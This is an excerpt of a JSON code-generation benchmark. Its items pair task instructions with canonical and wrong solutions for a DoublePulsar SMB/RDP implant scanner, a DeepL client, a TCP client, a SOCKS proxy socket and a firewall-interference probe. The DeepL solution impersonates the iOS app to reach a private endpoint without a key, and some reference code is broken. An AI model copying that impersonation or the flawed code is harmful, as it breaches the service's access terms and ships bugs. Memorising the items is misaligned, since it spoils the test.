    "Canonical_solution": "import socket\nimport ssl\nimport struct\nimport binascii\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n\n        # RDP Packets\n        self.ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080001000000\")\n        self.non_ssl_negotiation_request = binascii.unhexlify(\"030000130ee000000000000100080000000000\")\n        self.non_ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ssl_client_data = binascii.unhexlify(\"030001ac02f0807f658201a00401010401010101ff30190201220201020201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201020482013f000500147c00018136000800100001c00044756361812801c0d800040008000005000401ca03aa09080000b01d0000000000000000000000000000000000000000000000000000000000000000000007000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca01000000000018000f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000100000004c00c00110000000000000002c00c001b0000000000000003c0380004000000726470647200000000008080726470736e640000000000c0647264796e766300000080c0636c6970726472000000a0c0\")\n        self.ping_packet = binascii.unhexlify(\"0300000e02f0803c443728190200\")\n\n        # SMB Packets\n        self.negotiate_protocol_request = binascii.unhexlify(\"00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200\")\n        self.session_setup_request = binascii.unhexlify(\"00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000\")\n        self.tree_connect_request = binascii.unhexlify(\"00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00\")\n        self.trans2_session_setup = binascii.unhexlify(\"0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000\")\n\n    def check_ip_smb(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 445))\n\n        s.send(self.negotiate_protocol_request)\n        s.recv(1024)\n\n        s.send(self.session_setup_request)\n        session_setup_response = s.recv(1024)\n        user_id = session_setup_response[32:34]\n\n        modified_tree_connect_request = list(self.tree_connect_request)\n        modified_tree_connect_request[32] = user_id[0]\n        modified_tree_connect_request[33] = user_id[1]\n        modified_tree_connect_request = \"\".join(modified_tree_connect_request)\n\n        s.send(modified_tree_connect_request)\n        tree_connect_response = s.recv(1024)\n        tree_id = tree_connect_response[28:30]\n\n        modified_trans2_session_setup = list(self.trans2_session_setup)\n        modified_trans2_session_setup[28] = tree_id[0]\n        modified_trans2_session_setup[29] = tree_id[1]\n        modified_trans2_session_setup[32] = user_id[0]\n        modified_trans2_session_setup[33] = user_id[1]\n        modified_trans2_session_setup = \"\".join(modified_trans2_session_setup)\n\n        s.send(modified_trans2_session_setup)\n        final_response = s.recv(1024)\n        s.close()\n\n        if final_response[34] == \"\\x51\":\n            signature = final_response[18:26]\n            signature_long = struct.unpack('<Q', signature)[0]\n            key = self._calculate_doublepulsar_xor_key(signature_long)\n            return True, f\"DoublePulsar SMB implant detected XOR KEY: {hex(key)}\"\n        return False, \"No presence of DOUBLEPULSAR SMB implant\"\n\n    def check_ip_rdp(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(float(self.timeout) if self.timeout else None)\n        s.connect((self.ip, 3389))\n\n        s.send(self.ssl_negotiation_request)\n        negotiation_response = s.recv(1024)\n\n        if len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x02\" and negotiation_response[15] == \"\\x01\":\n            sock = ssl.wrap_socket(s)\n            s = sock\n            s.send(self.ssl_client_data)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x02\":\n            s.close()\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(float(self.timeout) if self.timeout else None)\n            s.connect((self.ip, 3389))\n            s.send(self.non_ssl_negotiation_request)\n            s.recv(1024)\n        elif len(negotiation_response) >= 19 and negotiation_response[11] == \"\\x03\" and negotiation_response[15] == \"\\x05\":\n            s.close()\n            return False, \"Server requires NLA, which DOUBLEPULSAR does not support\"\n        else:\n            s.send(self.non_ssl_client_data)\n            s.recv(1024)\n\n        s.send(self.ping_packet)\n        try:\n            ping_response = s.recv(1024)\n            s.close()\n            if len(ping_response) == 288:\n                return True, \"DoublePulsar SMB implant detected\"\n            return False, f\"Status Unknown - Response received but length was {len(ping_response)} not 288\"\n        except socket.error:\n            return False, \"No presence of DOUBLEPULSAR RDP implant\"\n\n    def _calculate_doublepulsar_xor_key(self, s):\n        x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8))\n        return x & 0xffffffff",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\nclass DoublePulsar:\n    def __init__(self, ip=\"127.0.0.1\", timeout=None, verbose=False):\n        self.ip = ip\n        self.timeout = timeout\n        self.verbose = verbose\n        self.ssl_negotiation_request = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.non_ssl_negotiation_request = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.non_ssl_client_data = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.ssl_client_data = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.ping_packet = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.negotiate_protocol_request = b'\\x72\\x6f\\x6f\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.session_setup_request = b'\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x73\\x69\\x6e\\x67\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.tree_connect_request = b'\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x73\\x69\\x6e\\x67\\x00\\x00\\x00\\x00\\x00\\x00'\n        self.trans2_session_setup = b'\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x73\\x69\\x6e\\x67\\x00\\x00\\x00\\x00\\x00\\x00'\n\n    def _calculate_doublepulsar_xor_key(self, s: int) -> int:\n        return s ^ 0x87\n\n    def check_ip_smb(self):\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n                sock.settimeout(self.timeout)\n                sock.connect((self.ip, 445))\n                sock.sendall(self.negotiate_protocol_request)\n                response = sock.recv(1024)\n                if self.verbose:\n                    print(f\"SMB Negotiation Response: {response}\")\n                if b'\\x00\\x00\\x00\\x00' in response:\n                    return (True, \"DoublePulsar implant detected in SMB service\")\n                else:\n                    return (False, \"No DoublePulsar implant detected in SMB service\")\n        except Exception as e:\n            return (False, f\"Error during SMB check: {str(e)}\")\n\n    def check_ip_rdp(self):\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n                sock.settimeout(self.timeout)\n                sock.connect((self.ip, 3389))\n                sock.sendall(self.ssl_negotiation_request)\n                response = sock.recv(1024)\n                if self.verbose:\n                    print(f\"RDP SSL Negotiation Response: {response}\")\n                if b'\\x00\\x00\\x00\\x00' in response:\n                    return (True, \"DoublePulsar implant detected in RDP service\")\n                else:\n                    return (False, \"No DoublePulsar implant detected in RDP service\")\n        except Exception as e:\n            return (False, f\"Error during RDP check: {str(e)}\")"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a function to translate text using the DeepL API with HTTP client functionality, supporting multiple language translations and alternative translations.\n\nFunction Description: The function uses the httpx library to send HTTP POST requests to the DeepL API endpoint. It handles text translation between specified source and target languages, with options for requesting alternative translations and proxy support. The function includes error handling for HTTP status codes and processes the JSON response to extract translated text.\n\nInput:\n- text: (str) - The text to be translated\n- sourceLang: (str, optional) - Source language code (auto-detected if None)\n- targetLang: (str, optional) - Target language code (defaults to \"EN\")\n- numberAlternative: (int, optional) - Number of alternative translations to request (0-3)\n- printResult: (bool, optional) - Whether to print the translation result\n- proxies: (dict, optional) - Proxy configuration for the HTTP client\n\nOutput:\n- If numberAlternative <= 1: returns (str) - The translated text\n- If numberAlternative > 1: returns (list[str]) - List of alternative translations\n- Returns None if HTTP request fails (non-200 status)\n- Raises TooManyRequestsException on HTTP 429 status",
    "Canonical_solution": "import random\nimport time\nimport json\nimport httpx\nfrom langdetect import detect\n\ndeeplAPI = \"https://www2.deepl.com/jsonrpc\"\nheaders = {\n    \"Content-Type\": \"application/json\",\n    \"Accept\": \"*/*\",\n    \"x-app-os-name\": \"iOS\",\n    \"x-app-os-version\": \"16.3.0\",\n    \"Accept-Language\": \"en-US,en;q=0.9\",\n    \"Accept-Encoding\": \"gzip, deflate, br\",\n    \"x-app-device\": \"iPhone13,2\",\n    \"User-Agent\": \"DeepL-iOS/2.9.1 iOS 16.3.0 (iPhone13,2)\",\n    \"x-app-build\": \"510265\",\n    \"x-app-version\": \"2.9.1\",\n    \"Connection\": \"keep-alive\",\n}\n\ndef translate(\n    text,\n    sourceLang=None,\n    targetLang=None,\n    numberAlternative=0,\n    printResult=False,\n    proxies=None,\n):\n    iCount = getICount(text)\n    id = getRandomNumber()\n\n    if sourceLang is None:\n        sourceLang = detectLang(text)\n    if targetLang is None:\n        targetLang = \"EN\"\n\n    numberAlternative = max(min(3, numberAlternative), 0)\n\n    postData = {\n        \"jsonrpc\": \"2.0\",\n        \"method\": \"LMT_handle_texts\",\n        \"id\": id,\n        \"params\": {\n            \"texts\": [{\"text\": text, \"requestAlternatives\": numberAlternative}],\n            \"splitting\": \"newlines\",\n            \"lang\": {\n                \"source_lang_user_selected\": sourceLang,\n                \"target_lang\": targetLang,\n            },\n            \"timestamp\": getTimestamp(iCount),\n            \"commonJobParams\": {\n                \"wasSpoken\": False,\n                \"transcribe_as\": \"\",\n            },\n        },\n    }\n    postDataStr = json.dumps(postData, ensure_ascii=False)\n\n    if (id + 5) % 29 == 0 or (id + 3) % 13 == 0:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\" : \"', -1)\n    else:\n        postDataStr = postDataStr.replace('\"method\":\"', '\"method\": \"', -1)\n\n    with httpx.Client(proxies=proxies) as client:\n        resp = client.post(url=deeplAPI, data=postDataStr, headers=headers)\n        respStatusCode = resp.status_code\n\n        if respStatusCode == 429:\n            raise TooManyRequestsException\n            return \n\n        if respStatusCode != 200:\n            print(\"Error\", respStatusCode)\n            return\n\n        respText = resp.text\n        respJson = json.loads(respText)\n\n        if numberAlternative <= 1:\n            targetText = respJson[\"result\"][\"texts\"][0][\"text\"]\n            if printResult:\n                print(targetText)\n            return targetText\n\n        targetTextArray = []\n        for item in respJson[\"result\"][\"texts\"][0][\"alternatives\"]:\n            targetTextArray.append(item[\"text\"])\n            if printResult:\n                print(item[\"text\"])\n\n        return targetTextArray",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import httpx\nfrom typing import Optional, List, Union, Dict\n\nclass TooManyRequestsException(Exception):\n    pass\n\nasync def translate_text(text: str, sourceLang: Optional[str] = None, targetLang: Optional[str] = \"EN\", numberAlternative: int = 0, printResult: bool = False, proxies: Optional[Dict] = None) -> Union[str, List[str], None]:\n    api_key = \"YOUR_DEEPL_API_KEY\"\n    base_url = \"https://api.deepl.com/v2/translate\"\n    headers = {\n        \"Authorization\": f\"DeepL-Auth-Key {api_key}\",\n        \"Content-Type\": \"application/json\"\n    }\n    data = {\n        \"text\": text,\n        \"target_lang\": targetLang\n    }\n    if sourceLang:\n        data[\"source_lang\"] = sourceLang\n    if numberAlternative > 0:\n        data[\"alternativeTranslations\"] = numberAlternative\n\n    async with httpx.AsyncClient(proxies=proxies) as client:\n        response = await client.post(base_url, json=data, headers=headers)\n        if response.status_code == 429:\n            raise TooManyRequestsException(\"Too many requests, please try again later.\")\n        if response.status_code != 200:\n            return None\n        result = response.json()\n        if \"translations\" in result:\n            translations = [trans[\"text\"] for trans in result[\"translations\"]]\n            if numberAlternative <= 1:\n                return translations[0] if translations else None\n            else:\n                return translations\n        else:\n            return None"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a TCP client function that establishes a connection to a server, sends a message, and receives a response.\n\nFunction Description: The function creates a TCP socket, connects to a specified server, sends a UTF-8 encoded message, receives a response, and then closes the connection. It handles the basic TCP client-server interaction.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- message: str - The message to be sent to the server\n\nOutput:\n- str - The decoded response received from the server",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host: str, port: int, message: str):\n    \"\"\"\n    TCP client interaction function that sends a message to server and receives response\n    \n    Args:\n        host: Server host address\n        port: Server port number\n        message: Message to send to server\n        \n    Returns:\n        The response received from server\n    \"\"\"\n    # Create TCP socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Connect to server\n    s.connect((host, port))\n    \n    # Send message\n    len_sent = s.send(message.encode('utf-8'))\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Clean up\n    s.close()\n    \n    return response.decode('utf-8')",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client(host, port, message):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((host, port))\n        sock.sendall(message.encode('utf-8'))\n        response = sock.recv(1024)\n    return response.decode('utf-8')"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Create a SOCKS-enabled socket class that extends Python's built-in socket functionality to support proxy connections through SOCKS4, SOCKS5, and HTTP proxies.\n\nClass Description: The `socksocket` class extends Python's `socket.socket` class to provide proxy support. It handles connection establishment through various proxy types while maintaining standard socket functionality. The class manages proxy configuration, connection negotiation, and error handling for proxy-related operations.\n\nAttributes:\n- default_proxy: [Class Variable] - Default proxy configuration used when no specific proxy is set\n- _proxyconn: [socket.socket] - TCP connection used to maintain UDP relay (for SOCKS5 UDP)\n- proxy: [tuple] - Current proxy configuration (type, addr, port, rdns, username, password)\n- proxy_sockname: [tuple] - The bound address (IP, port) of the proxy connection\n- proxy_peername: [tuple] - The destination address (IP, port) through the proxy\n- _timeout: [float] - Socket timeout value\n\nMethods:\n- __init__(family, type, proto, *args, **kwargs) -> None - Initializes the socket with optional proxy support. Validates socket type and sets up proxy attributes.\n- set_proxy(proxy_type, addr, port, rdns, username, password) -> None - Configures proxy settings for the socket.\n- connect(dest_pair) -> None - Establishes connection to destination through configured proxy. Handles both direct and proxied connections.\n- _readall(file, count) -> bytes - Internal method to read exact number of bytes from a file object.\n- _proxy_addr() -> tuple - Internal method to resolve proxy address and port.\n- _negotiate_SOCKS4(dest_addr, dest_port) -> None - Internal method to handle SOCKS4 proxy negotiation.\n- _negotiate_SOCKS5(dest_addr, dest_port) -> None - Internal method to handle SOCKS5 proxy negotiation.\n- _negotiate_HTTP(dest_addr, dest_port) -> None - Internal method to handle HTTP proxy negotiation.",
    "Canonical_solution": "import socket\nfrom errno import EOPNOTSUPP, EINVAL, EAGAIN\nimport struct\nfrom io import BytesIO\nfrom base64 import b64encode\n\nclass socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET and proto=0.\n    The \"type\" argument must be either SOCK_STREAM or SOCK_DGRAM.\n    \"\"\"\n\n    default_proxy = None\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,\n                 proto=0, *args, **kwargs):\n        if type not in (socket.SOCK_STREAM, socket.SOCK_DGRAM):\n            msg = \"Socket type must be stream or datagram, not {!r}\"\n            raise ValueError(msg.format(type))\n\n        super(socksocket, self).__init__(family, type, proto, *args, **kwargs)\n        self._proxyconn = None  # TCP connection to keep UDP relay alive\n\n        if self.default_proxy:\n            self.proxy = self.default_proxy\n        else:\n            self.proxy = (None, None, None, None, None, None)\n        self.proxy_sockname = None\n        self.proxy_peername = None\n\n        self._timeout = None\n\n    def _readall(self, file, count):\n        \"\"\"Receive EXACTLY the number of bytes requested from the file object.\"\"\"\n        data = b\"\"\n        while len(data) < count:\n            d = file.read(count - len(data))\n            if not d:\n                raise GeneralProxyError(\"Connection closed unexpectedly\")\n            data += d\n        return data\n\n    def set_proxy(self, proxy_type=None, addr=None, port=None, rdns=True,\n                  username=None, password=None):\n        \"\"\"Sets the proxy to be used.\"\"\"\n        self.proxy = (proxy_type, addr, port, rdns,\n                      username.encode() if username else None,\n                      password.encode() if password else None)\n\n    def connect(self, dest_pair):\n        \"\"\"\n        Connects to the specified destination through a proxy.\n        Uses the same API as socket's connect().\n\n        dest_pair - 2-tuple of (IP/hostname, port).\n        \"\"\"\n        if len(dest_pair) != 2 or dest_pair[0].startswith(\"[\"):\n            raise socket.error(\"PySocks doesn't support IPv6: %s\" % str(dest_pair))\n\n        dest_addr, dest_port = dest_pair\n\n        if self.type == socket.SOCK_DGRAM:\n            if not self._proxyconn:\n                self.bind((\"\", 0))\n            dest_addr = socket.gethostbyname(dest_addr)\n\n            if dest_addr == \"0.0.0.0\" and not dest_port:\n                self.proxy_peername = None\n            else:\n                self.proxy_peername = (dest_addr, dest_port)\n            return\n\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n\n        if (not isinstance(dest_pair, (list, tuple))\n                or len(dest_pair) != 2\n                or not dest_addr\n                or not isinstance(dest_port, int)):\n            raise GeneralProxyError(\n                \"Invalid destination-connection (host, port) pair\")\n\n        super(socksocket, self).settimeout(self._timeout)\n\n        if proxy_type is None:\n            self.proxy_peername = dest_pair\n            super(socksocket, self).settimeout(self._timeout)\n            super(socksocket, self).connect((dest_addr, dest_port))\n            return\n\n        proxy_addr = self._proxy_addr()\n\n        try:\n            super(socksocket, self).connect(proxy_addr)\n        except socket.error as error:\n            self.close()\n            proxy_addr, proxy_port = proxy_addr\n            proxy_server = \"{0}:{1}\".format(proxy_addr, proxy_port)\n            printable_type = PRINTABLE_PROXY_TYPES[proxy_type]\n\n            msg = \"Error connecting to {0} proxy {1}\".format(printable_type,\n                                                             proxy_server)\n            raise ProxyConnectionError(msg, error)\n        else:\n            try:\n                negotiate = self._proxy_negotiators[proxy_type]\n                negotiate(self, dest_addr, dest_port)\n            except socket.error as error:\n                self.close()\n                raise GeneralProxyError(\"Socket error\", error)\n            except ProxyError:\n                self.close()\n                raise\n\n    def _proxy_addr(self):\n        \"\"\"Return proxy address to connect to as tuple object\"\"\"\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n        proxy_port = proxy_port or DEFAULT_PORTS.get(proxy_type)\n        if not proxy_port:\n            raise GeneralProxyError(\"Invalid proxy type\")\n        return proxy_addr, proxy_port\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS5 server.\"\"\"\n        self.proxy_peername, self.proxy_sockname = self._SOCKS5_request(\n            self, b\"\\x01\", (dest_addr, dest_port))\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS4 server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        writer = self.makefile(\"wb\")\n        reader = self.makefile(\"rb\", 0)\n        try:\n            remote_resolve = False\n            try:\n                addr_bytes = socket.inet_aton(dest_addr)\n            except socket.error:\n                if rdns:\n                    addr_bytes = b\"\\x00\\x00\\x00\\x01\"\n                    remote_resolve = True\n                else:\n                    addr_bytes = socket.inet_aton(\n                        socket.gethostbyname(dest_addr))\n\n            writer.write(struct.pack(\">BBH\", 0x04, 0x01, dest_port))\n            writer.write(addr_bytes)\n\n            if username:\n                writer.write(username)\n            writer.write(b\"\\x00\")\n\n            if remote_resolve:\n                writer.write(dest_addr.encode(\"idna\") + b\"\\x00\")\n            writer.flush()\n\n            resp = self._readall(reader, 8)\n            if resp[0:1] != b\"\\x00\":\n                raise GeneralProxyError(\n                    \"SOCKS4 proxy server sent invalid data\")\n\n            status = ord(resp[1:2])\n            if status != 0x5A:\n                error = SOCKS4_ERRORS.get(status, \"Unknown error\")\n                raise SOCKS4Error(\"{0:#04x}: {1}\".format(status, error))\n\n            self.proxy_sockname = (socket.inet_ntoa(resp[4:]),\n                                   struct.unpack(\">H\", resp[2:4])[0])\n            if remote_resolve:\n                self.proxy_peername = socket.inet_ntoa(addr_bytes), dest_port\n            else:\n                self.proxy_peername = dest_addr, dest_port\n        finally:\n            reader.close()\n            writer.close()\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through an HTTP server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        addr = dest_addr if rdns else socket.gethostbyname(dest_addr)\n\n        http_headers = [\n            (b\"CONNECT \" + addr.encode(\"idna\") + b\":\" +\n             str(dest_port).encode() + b\" HTTP/1.1\"),\n            b\"Host: \" + dest_addr.encode(\"idna\")\n        ]\n\n        if username and password:\n            http_headers.append(b\"Proxy-Authorization: basic \" +\n                                b64encode(username + b\":\" + password))\n\n        http_headers.append(b\"\\r\\n\")\n\n        self.sendall(b\"\\r\\n\".join(http_headers))\n\n        fobj = self.makefile()\n        status_line = fobj.readline()\n        fobj.close()\n\n        if not status_line:\n            raise GeneralProxyError(\"Connection closed unexpectedly\")\n\n        try:\n            proto, status_code, status_msg = status_line.split(\" \", 2)\n        except ValueError:\n            raise GeneralProxyError(\"HTTP proxy server sent invalid response\")\n\n        if not proto.startswith(\"HTTP/\"):\n            raise GeneralProxyError(\n                \"Proxy server does not appear to be an HTTP proxy\")\n\n        try:\n            status_code = int(status_code)\n        except ValueError:\n            raise HTTPError(\n                \"HTTP proxy server did not return a valid HTTP status\")\n\n        if status_code != 200:\n            error = \"{0}: {1}\".format(status_code, status_msg)\n            raise HTTPError(error)\n\n        self.proxy_sockname = (b\"0.0.0.0\", 0)\n        self.proxy_peername = addr, dest_port\n\n    _proxy_negotiators = {\n        SOCKS4: _negotiate_SOCKS4,\n        SOCKS5: _negotiate_SOCKS5,\n        HTTP: _negotiate_HTTP\n    }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport ssl\nimport base64\n\nclass socksocket(socket.socket):\n    default_proxy = None\n\n    def __init__(self, family, type, proto, *args, **kwargs):\n        super().__init__(family, type, proto, *args, **kwargs)\n        self.proxy = None\n        self._timeout = self.gettimeout()\n        self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n    def set_proxy(self, proxy_type, addr, port, rdns, username, password):\n        self.proxy = (proxy_type, addr, port, rdns, username, password)\n\n    def connect(self, dest_pair):\n        if self.proxy:\n            proxy_type, addr, port, rdns, username, password = self.proxy\n            if proxy_type == 'SOCKS4':\n                self._negotiate_SOCKS4(dest_pair[0], dest_pair[1])\n            elif proxy_type == 'SOCKS5':\n                self._negotiate_SOCKS5(dest_pair[0], dest_pair[1])\n            elif proxy_type == 'HTTP':\n                self._negotiate_HTTP(dest_pair[0], dest_pair[1])\n            else:\n                raise ValueError(\"Unsupported proxy type\")\n        else:\n            super().connect(dest_pair)\n\n    def _readall(self, file, count):\n        data = b''\n        while len(data) < count:\n            buf = file.read(count - len(data))\n            if not buf:\n                break\n            data += buf\n        return data\n\n    def _proxy_addr(self):\n        if self.proxy:\n            return (self.proxy[1], self.proxy[2])\n        return (self.getsockname()[0], self.getsockname()[1])\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        proxy_addr, proxy_port = self._proxy_addr()\n        self.connect((proxy_addr, proxy_port))\n        self.sendall(b'\\x04')  # SOCKS4 command\n        self.sendall(dest_addr.encode('ascii') + b'\\x00' + str(dest_port).encode('ascii'))\n        response = self.recv(8)\n        if response[0] != 0:\n            raise ConnectionError(\"SOCKS4 negotiation failed\")\n        self.settimeout(0.1)\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        proxy_addr, proxy_port = self._proxy_addr()\n        self.connect((proxy_addr, proxy_port))\n        self.sendall(b'\\x05')  # SOCKS5 version\n        self.sendall(b'\\x01\\x00\\x00\\x03' + dest_addr.encode('ascii') + b'\\x00' + str(dest_port).encode('ascii'))\n        response = self.recv(2)\n        if response[0] != 0:\n            raise ConnectionError(\"SOCKS5 negotiation failed\")\n        self.settimeout(0.1)\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        proxy_addr, proxy_port = self._proxy_addr()\n        self.connect((proxy_addr, proxy_port))\n        self.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + dest_addr.encode('ascii') + b'\\r\\n\\r\\n')\n        response = self.recv(1024)\n        if b'407' in response:\n            raise ConnectionError(\"HTTP proxy authentication required\")\n        self.settimeout(0.1)"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a function to probe an HTTP server's connectivity and response behavior, checking for potential network interference or server availability issues.\n\nFunction Description: The function attempts to connect to an HTTP server, send a GET request with a specific keyword, and analyze the response. It also checks Redis for potential firewall interference patterns. The function returns different status codes based on the server's response and network conditions.\n\nInput:\n- domain: [str] - The domain name of the target server\n- ip: [str] - The IP address of the target server\n- keyword: [str] - The search keyword to include in the GET request\n\nOutput:\n- [int] - Returns one of the following status codes:\n  * RET_SUCCESS (1) if server responds normally\n  * RET_SVR_NO_RESP (2) if server doesn't respond or times out\n  * RET_GFW_RST (3) if firewall interference is detected\n  * RET_OTHER (99) for other unexpected errors",
    "Canonical_solution": "import os\nimport socket\nimport errno\nimport time\nimport redis\nimport struct\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    redis_conn = redis.StrictRedis(host='localhost', port=6389, db=0)\n\n    ret = 0\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((ip, 80))\n        s.sendall(\"GET /?keyword=%s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\nUser-Agent: connectivity measurement\\r\\n\\r\\n\" % (keyword, domain))\n        data = s.recv(1024)\n        s.shutdown(socket.SHUT_RDWR)\n        s.close()\n        if data and len(data) > 1:\n            ret = 1\n    except socket.timeout:\n        ret = 0\n    except socket.error, serr:\n        if serr[0] == errno.ECONNRESET:\n            ret = -1\n        elif serr[0] == errno.ETIMEDOUT:\n            ret = 0\n        else:\n            ret = -99\n    except Exception, err:\n        ret = -99\n\n    time.sleep(2)\n    type1rst = redis_conn.keys(\"rst:attack1:*_%d\" % ip2int(ip))\n    type2rst = redis_conn.keys(\"rst:attack2:*_%d\" % ip2int(ip))\n    if type1rst or type2rst:\n        return RET_GFW_RST\n    else:\n        if ret == -1:\n            return RET_SVR_NO_RESP\n        elif ret == 0:\n            return RET_SVR_NO_RESP\n        elif ret == 1:\n            return RET_SUCCESS\n        else:\n            return RET_OTHER\n\ndef ip2int(addr):                                                               \n    return struct.unpack(\"I\", socket.inet_aton(addr))[0]",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import requests\nimport redis\n\ndef probe_http_server(domain, ip, keyword):\n    RET_SUCCESS = 1\n    RET_SVR_NO_RESP = 2\n    RET_GFW_RST = 3\n    RET_OTHER = 99\n\n    try:\n        # Send HTTP GET request\n        response = requests.get(f\"http://{domain}?q={keyword}\", timeout=5)\n        if response.status_code == 200:\n            # Check Redis for firewall interference patterns\n            r = redis.Redis(host='localhost', port=6379, db=0)\n            pattern = f\"{keyword} firewall\"\n            if r.exists(pattern):\n                return RET_GFW_RST\n            else:\n                return RET_SUCCESS\n        else:\n            return RET_SVR_NO_RESP\n    except Exception as e:\n        return RET_OTHER"
  },
  {
    "Task_id": 327,
